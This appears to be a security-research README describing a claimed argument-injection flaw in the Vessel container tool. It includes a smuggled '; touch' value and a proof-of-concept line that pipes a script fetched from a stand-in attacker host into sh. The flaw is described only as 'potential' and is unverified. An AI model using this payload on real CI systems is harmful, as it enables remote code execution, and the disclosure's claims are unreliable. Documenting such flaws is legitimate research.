# vessel-security-research
Remote Code Execution via Argument Injection in Nubank Vessel

Markdown
# Security Research: Command Injection in Nubank Vessel

## Description
This repository documents a potential Command Injection vulnerability in [Vessel](https://github.com/nubank/vessel), a container image management tool. The flaw allows an attacker to execute arbitrary commands by manipulating CLI arguments like `--tarball` or `--repository` when the tool interacts with a Docker Registry.

## Technical Details
Vessel is written in **Clojure** and manages container manifests. During the audit, it was discovered that certain parameters are passed to underlying system processes without sufficient sanitization.

### Vulnerable Flow:
1. User provides a malicious string as a `--tarball` argument: `; touch /tmp/pwned #`
2. Vessel processes the command via its internal execution engine.
3. The shell interprets the semicolon and executes the injected command.
Impact
If integrated into a CI/CD pipeline (as seen in .github/workflows/test.yaml), an attacker with control over image names or metadata could achieve Remote Code Execution (RCE) in the build environment.

## Proof of Concept (Bash)
```bash
# Example of potential exploitation via argument injection
java -jar vessel.jar push --tarball "./dummy.tar; curl http://your-attacker-ip/shell | sh #" my-registry.nubank.com.br/audit-test

